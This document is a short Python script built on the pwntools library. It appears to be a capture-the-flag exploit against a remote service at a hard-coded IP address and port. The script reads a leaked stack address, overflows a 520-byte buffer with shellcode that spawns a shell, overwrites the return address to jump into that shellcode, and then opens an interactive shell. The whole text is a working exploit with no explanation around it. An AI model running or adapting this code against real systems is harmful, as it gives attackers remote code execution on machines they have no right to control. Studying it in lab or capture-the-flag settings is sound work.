from pwn import *

# Connect to the remote server
ps = remote("207.154.239.148", 1337)

# Receive initial response and extract address
resp = ps.recv()
address = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)

# Generate shellcode
context.arch = "amd64"
shell = asm(shellcraft.sh())

# Craft the payload
payload = shell
payload += b'z' * (520 - len(shell))
payload += p64(address - 540)

# Send the payload
ps.sendline(payload)

# Interact with the process
ps.interactive()
